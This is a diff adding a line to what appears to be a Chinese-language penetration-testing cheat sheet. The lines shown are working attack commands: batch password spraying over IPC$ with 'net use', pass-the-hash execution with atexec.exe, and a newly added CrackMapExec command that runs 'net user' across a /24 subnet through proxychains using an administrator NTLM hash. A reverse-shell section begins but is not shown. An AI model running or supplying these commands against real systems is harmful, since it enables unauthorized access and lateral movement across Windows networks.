@@ -718,6 +718,10 @@ FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\admin
 FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
 ```
 
+cme 批量
+```
+proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x "net user"
+```
 
 
 ## 反弹shell
